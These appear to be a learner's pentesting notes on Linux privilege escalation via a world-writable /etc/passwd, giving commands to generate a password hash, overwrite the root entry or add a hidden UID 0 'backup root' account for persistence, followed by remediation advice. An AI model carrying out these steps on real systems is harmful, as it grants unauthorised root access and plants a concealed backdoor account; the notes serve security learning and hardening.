## 📝 Linux PrivEsc Notes: Writable `/etc/passwd` File

---

## Target Vector
Unsafe file permissions (world-writable) on `/etc/passwd`

## Exploit Mechanism
User creation or UID 0 manipulation → privilege escalation

---

# 1. Backend Concept: `/etc/passwd` Ka Role

The `/etc/passwd` file stores **user account information** (not passwords anymore).

---

## Standard Entry Format

```text
root:x:0:0:root:/root:/bin/bash
```

---

## Field Breakdown

| Field | Meaning |
|------|--------|
| root | Username |
| x | Placeholder for password (stored in `/etc/shadow`) |
| 0 | User ID (UID) |
| 0 | Group ID (GID) |
| root | Comment / info |
| /root | Home directory |
| /bin/bash | Default shell |

---

## Critical Concept 🔥

- UID **0 = root privilege**
- Username does NOT matter
- If UID = 0 → full root access

---

## The Vulnerability

If `/etc/passwd` becomes writable:

- Attacker can modify existing users
- OR create a new user with UID 0
- System will trust it as root

---

# 2. Step-by-Step Exploitation

---

## Step A: Check Permissions

```bash
ls -l /etc/passwd
```

### Vulnerable output:
```text
-rw-rw-rw- 1 root root ...
```

### Meaning:
- World-writable file
- Any user can modify system accounts

---

## Step B: Generate Password Hash

```bash
openssl passwd mypassword123
```

### Example output:
```text
1Y.aB8zKx2v9Q
```

---

# Step C: Exploitation Method 1  
## Modify Existing Root Entry

```bash
nano /etc/passwd
```

---

### Before:
```text
root:x:0:0:root:/root:/bin/bash
```

### After:
```text
root:1Y.aB8zKx2v9Q:0:0:root:/root:/bin/bash
```

---

## Result:
```bash
su root
```

Password:
```
mypassword123
```

---

# Step D: Exploitation Method 2 (Preferred)
## Create New UID 0 User (Persistence Technique)

---

### Add new line at bottom:

```text
newroot:1Y.aB8zKx2v9Q:0:0:root:/root:/bin/bash
```

---

## Why this works

- UID = 0 → root privileges
- System does NOT differentiate original root vs fake root
- You now have a **hidden backup root account**

---

## Gain Access

```bash
su newroot
```

Then:

```bash
whoami
```

Output:
```
root
```

---

# 🛡️ Remediation (Fix)

---

## Secure Permissions

```bash
sudo chmod 644 /etc/passwd
```

---

## Optional Hardening

- Monitor changes to `/etc/passwd`
- Use integrity tools like AIDE or Tripwire
- Restrict write access to root only

---

# 🧠 Concept Summary

- `/etc/passwd` = user identity database
- Passwords are NOT stored here anymore
- UID = 0 is the real root trigger
- Writable file = full system compromise

---

# 🔥 Quick Comparison

| Attack Type | File | Impact |
|------------|------|--------|
| Shadow overwrite | `/etc/shadow` | Password replacement |
| Passwd injection | `/etc/passwd` | Root user creation (UID 0) |

---

# ⚡ Key Insight

Even if you don’t know the root password,  
you can **become root by creating your own UID 0 user**.


